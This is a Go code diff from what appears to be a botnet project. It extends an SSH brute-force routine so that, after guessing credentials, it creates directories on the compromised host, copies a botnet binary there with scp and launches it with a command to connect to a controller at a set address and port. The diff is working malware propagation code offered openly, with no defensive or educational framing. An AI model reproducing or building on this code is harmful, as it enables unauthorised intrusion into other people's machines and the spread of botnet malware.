@@ -87,6 +87,8 @@ func (a *Attack) bruteForce(host string) {
 				port:     strings.Split(host, ":")[1],
 			}
 
+			fmt.Println("[*] we are in!")
+
 			found = true
 			break
 		}
@@ -96,19 +98,48 @@ func (a *Attack) bruteForce(host string) {
 		}
 	}
 
-	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/linux/botnet", "/home/rodrigo/botnet/bin", c); err != nil {
-		fmt.Println("[ERROR] sending botnet binary")
-		return
-	}
-
 	sess, err := getSSHSession(c.host, c.username, c.password)
 	if err != nil {
 		fmt.Printf("[ERROR] creating ssh session %v\n", err)
 		return
 	}
 
-	cmd := "/home/rodrigo/botnet/bin/botnet -target 192.168.0.2 -port 9999"
+	// get the home path
+	fmt.Println("[*] getting home directory")
+	cmd := "pwd"
+	out, err := sess.Output(cmd)
+	if err != nil {
+		fmt.Printf("[ERROR] getting home directory %v\n", err)
+		return
+	}
+	sess.Close()
 
+	// create the botnet bin path
+	fmt.Println("[*] creating botnet bin dir")
+	sess, err = getSSHSession(c.host, c.username, c.password)
+	if err != nil {
+		fmt.Printf("[ERROR] creating ssh session %v\n", err)
+		return
+	}
+	cmd = fmt.Sprintf("mkdir %s/botnet && mkdir %s/botnet/bin", strings.TrimSpace(string(out)), strings.TrimSpace(string(out)))
+	if err := sess.Start(cmd); err != nil {
+		fmt.Printf("[ERROR] creating botnet dirs %v\n", err)
+		return
+	}
+	sess.Close()
+
+	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/linux/botnet", strings.TrimSpace(string(out))+"/botnet/bin", c); err != nil {
+		fmt.Printf("[ERROR] sending botnet binary %v\n", err)
+		return
+	}
+
+	// execute botnet client
+	sess, err = getSSHSession(c.host, c.username, c.password)
+	if err != nil {
+		fmt.Printf("[ERROR] creating ssh session %v\n", err)
+		return
+	}
+	cmd = strings.TrimSpace(string(out)) + "/botnet/bin/botnet -target 192.168.0.2 -port 9999 connect"
 	if err := a.execute(cmd, sess); err != nil {
 		fmt.Printf("[ERROR] executing botnet %v\n", err)
 		return
@@ -153,7 +184,6 @@ func getContent(file string) ([]string, error) {
 }
 
 func getSSHSession(host, username, password string) (*ssh.Session, error) {
-	fmt.Printf("[*] Creating SSH session to %s\n", host)
 	config := &ssh.ClientConfig{
 		User: username,
 		Auth: []ssh.AuthMethod{
